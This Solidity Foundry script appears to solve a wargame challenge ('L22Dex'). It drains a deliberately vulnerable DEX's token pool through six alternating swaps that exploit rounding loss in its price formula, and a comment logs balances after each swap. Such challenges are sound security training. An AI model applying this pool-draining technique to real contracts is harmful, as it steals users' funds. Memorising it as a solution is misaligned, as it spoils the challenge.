// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Dex, SwappableToken} from "src/L22Dex.sol";

/**
 * @notice This script performs multiple swaps to exploit the precision loss vulnerability in the getSwapPrice calculation.
 * The goal is to drain one of the token pools by repeatedly swapping tokens and taking advantage of the precision loss and no slippage protection.
 *
 * 1st swap: Token 1 -> Token 2
 *  Token 1 balance 0 Token 2 balance 20
 *   Dex Token 1 balance 110 Dex Token 2 balance 90
 *
 * 2nd swap: Token 2 -> Token 1
 *   Token 1 balance 24 Token 2 balance 0
 *   Dex Token 1 balance 86 Dex Token 2 balance 110
 *
 * 3rd swap: Token 1 -> Token 2
 *   Token 1 balance 0 Token 2 balance 30
 *   Dex Token 1 balance 110 Dex Token 2 balance 80
 *
 * 4th swap: Token 2 -> Token 1
 *   Token 1 balance 41 Token 2 balance 0
 *   Dex Token 1 balance 69 Dex Token 2 balance 110
 *
 * 5th swap: Token 1 -> Token 2
 *   Token 1 balance 0 Token 2 balance 65
 *   Dex Token 1 balance 110 Dex Token 2 balance 45
 *
 * 6th swap: Token 2 -> Token 1
 *   Token 1 balance 110 Token 2 balance 20
 *   Dex Token 1 balance 0 Dex Token 2 balance 90
 */
contract L22DexAttack is Script, Broadcast {
    address constant instanceAddress = 0xe8A9EC3C730f0911e52462b915A516254272Aa16;

    Dex dex = Dex(instanceAddress);

    address myAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function run() public {
        // Approve the dex contract to spend your tokens
        dex.approve(address(dex), type(uint256).max);

        // Perform the swaps
        dex.swap(dex.token1(), dex.token2(), dex.balanceOf(dex.token1(), myAddress));
        _logBalances();
        dex.swap(dex.token2(), dex.token1(), dex.balanceOf(dex.token2(), myAddress));
        _logBalances();
        dex.swap(dex.token1(), dex.token2(), dex.balanceOf(dex.token1(), myAddress));
        _logBalances();
        dex.swap(dex.token2(), dex.token1(), dex.balanceOf(dex.token2(), myAddress));
        _logBalances();
        dex.swap(dex.token1(), dex.token2(), dex.balanceOf(dex.token1(), myAddress));
        _logBalances();

        // Final swap
        dex.swap(dex.token2(), dex.token1(), dex.balanceOf(dex.token2(), address(dex)));
        _logBalances();
    }

    function _logBalances() internal view {
        console.log(
            "Token 1 balance",
            dex.balanceOf(dex.token1(), myAddress),
            "Token 2 balance",
            dex.balanceOf(dex.token2(), myAddress)
        );
        console.log(
            "Dex Token 1 balance",
            dex.balanceOf(dex.token1(), address(dex)),
            "Dex Token 2 balance",
            dex.balanceOf(dex.token2(), address(dex))
        );
    }
}
